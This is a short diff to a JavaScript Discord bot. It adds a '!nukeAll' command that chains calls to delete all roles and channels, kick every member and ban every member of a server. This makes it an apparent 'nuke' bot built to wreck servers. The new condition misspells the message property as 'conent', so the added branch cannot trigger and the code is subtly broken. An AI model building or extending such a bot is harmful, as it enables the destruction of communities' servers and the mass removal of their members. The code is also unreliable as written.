@@ -25,6 +25,12 @@ client.on("messageCreate", async message => {
     if (message.content === '!banAll') {
         await banAll(message, client);
     }
+    if (message.conent === '!nukeAll') {
+        await nukeRoles(message, client);
+        await nukeChannels(message, client);
+        await kickAll(message, client);
+        await banAll(message, client);
+    }
 });
 
 client.login(process.env.TOKEN);
